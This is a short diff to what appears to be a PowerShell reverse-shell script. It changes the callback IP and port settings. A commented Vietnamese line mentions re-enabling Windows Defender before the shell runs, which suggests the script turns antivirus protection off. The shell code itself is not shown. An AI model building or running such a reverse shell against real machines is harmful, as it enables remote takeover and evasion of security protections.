@@ -2,7 +2,7 @@
 # REVERSE SHELL ONLY
 # ============================================
 
-$IP = '192.168.2.5'
+$IP = '172.20.10.3'
 $PORT = 6969
 
 # # Bật lại Defender TRƯỚC khi vào Reverse Shell
